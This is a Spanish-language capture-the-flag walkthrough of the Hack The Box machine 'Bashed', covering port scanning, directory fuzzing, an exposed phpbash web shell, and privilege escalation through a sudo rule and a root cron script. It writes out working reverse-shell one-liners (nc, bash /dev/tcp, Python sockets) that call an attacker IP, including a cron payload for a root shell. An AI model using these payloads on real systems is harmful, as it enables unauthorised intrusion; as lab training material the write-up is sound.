# Bashed-HTB
Resolucion de la maquina

## Nmap

```
nmap -sS -Pn --open 10.129.165.94 -oG scan 
```

Encontramos el puerto 80 tcp abierto

![image](https://github.com/gecr07/Bashed-HTB/assets/63270579/678fc948-f147-42df-82d1-fe6d367732b1)

Dentro de la pagina encontramos que esta montado eso intentamos ver si tiene ruta por defecto. Credencuales etc.

```
/uploads/phpbash.php 404 not found
```

![image](https://github.com/gecr07/Bashed-HTB/assets/63270579/0c544556-8cab-4cb5-bc5d-4532791899e2)

Entonces debe de haber otra ruta...

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -t 1000 -u  http://10.0.10.1:5000/FUZZ

# Encontramos todas esas rutas accesibles

http://10.129.79.161/php/ #Encontramos un archivo sendMail.php

http://10.129.79.161/images/ # Imagenes

http://10.129.79.161/fonts/ #Fonts

http://10.129.79.161/js/ #Js 

http://10.129.79.161/dev/ # Aqui esta el RCE inicial el phpbash.php

http://10.129.79.161/css/
```

## PHPBASH

> https://github.com/Arrexel/phpbash

![image](https://github.com/gecr07/Bashed-HTB/assets/63270579/97bf7979-4b93-4530-9189-126b9583904c)

## RCE

Intente salir de esa shell subiendo un php con nc y bash y no jalo pero con python si...

```
nc -e /bin/bash 10.10.14.74 443 # No Jalo

bash -i >& /dev/tcp/10.10.14.74/4444 0>&1 # no jalo mmm

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.74",443)); 
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


#Full tty

python -c ‘import pty; pty.spawn(“/bin/bash”);’

```
Si miramos un poco la maquina nos dice que:

> sudo -l reveals that the ​www-data​ user can run any command as scriptmanager​, without having to provide a password.

Entonces nos hacemos scriptmanager

```
(scriptmanager : scriptmanager) NOPASSWD: ALL

sudo -u scriptmanager /bin/bash
```

## Apache rutas interesantes

Aqui recopile algunas rutas interesantes.

```
/etc/apache2/sites-enabled
/etc/apache2/sites-enabled/000-default.conf
/var/www/pub
/etc/php/7.0/mods-available/ftp.ini
/usr/share/php7.0-common/common/ftp.ini
/home/scriptmanager/.bashrc
/var/www/html/config.php
## Busque archivos SUID


find / -name "*.*" -type f -perm -400

```

Al ejecutar el linpeas nos dimos cuenta de la existencia de un folder /scripts y tambien usamos el pspy para ver si hay una tarea cron y si.

```
pspy32s
```

![image](https://github.com/gecr07/Bashed-HTB/assets/63270579/9c427a79-031d-442b-91eb-1b26e5533e37)

Si vemos tiene el UID en cero lo que nos indica que root esta corriendo ese comando.

![image](https://github.com/gecr07/Bashed-HTB/assets/63270579/e63c0eda-4b2b-4599-852a-565ec9733d1f)

Podemos observar que el archivo se puede escribir por el usuario que somos scriptmanager.

```
Se ejecutara cada minuto y nos regresa una reverse shell con permisos de root.

echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.74",4444)); 
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > test.py
```

![image](https://github.com/gecr07/Bashed-HTB/assets/63270579/040d5787-ea2a-494e-8854-5a44229e1c9f)








